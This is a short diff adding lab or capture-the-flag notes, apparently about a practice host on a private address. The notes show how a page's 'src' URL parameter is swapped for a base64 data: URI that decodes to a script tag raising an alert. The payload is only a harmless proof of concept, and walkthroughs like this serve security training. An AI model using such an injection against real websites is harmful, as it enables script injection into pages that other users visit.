@@ -1,0 +1,7 @@
+On the home page click on 'National Security Agency' image.
+
+We can see url 'http://10.111.1.21/?page=media&src=nsa'. 
+
+Lets try to compromise it by changing 'src=nsa' to 'src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnQ09NUFJPTUlTRUQnKTwvc2NyaXB0Pg=='
+
+where PHNjcmlwdD5hbGVydCgnQ09NUFJPTUlTRUQnKTwvc2NyaXB0Pg==   ===> <script>alert('COMPROMISED')</script>
